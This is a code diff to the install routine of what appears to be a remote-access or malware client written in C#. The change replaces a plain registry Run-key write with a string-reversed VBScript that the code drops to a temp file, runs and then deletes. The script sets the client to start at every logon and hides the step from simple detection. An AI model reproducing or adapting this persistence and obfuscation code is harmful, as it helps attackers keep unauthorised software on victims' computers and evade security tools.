@@ -1,4 +1,5 @@
 ﻿using Client.Helper;
+using Microsoft.VisualBasic;
 using Microsoft.Win32;
 using System;
 using System.Diagnostics;
@@ -43,7 +44,19 @@ namespace Client.Install
                     fs.Dispose();
 
                     if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
-                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").SetValue(Path.GetFileName(Settings.ClientFullPath), Settings.ClientFullPath);
+                    {
+                        string tempName = Path.GetTempFileName() + ".vbs";
+                        string TempPath = Strings.StrReverse(Settings.ClientFullPath);
+                        String TempPathName = Strings.StrReverse(Path.GetFileName(Settings.ClientFullPath));
+                        using (StreamWriter sw = new StreamWriter(tempName, false))
+                        {
+                            sw.Write(Strings.StrReverse($@"""ZS_GER"",""{TempPath}"",""{TempPathName}\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"" etirWgeR.llehShsW
+)""llehS.tpircSW""(tcejbOetaerC = llehShsW teS"));
+                        }
+                        Process.Start(tempName);
+                        Thread.Sleep(1000);
+                        File.Delete(tempName);
+                    }
                     else
                     {
                         Process.Start(new ProcessStartInfo()
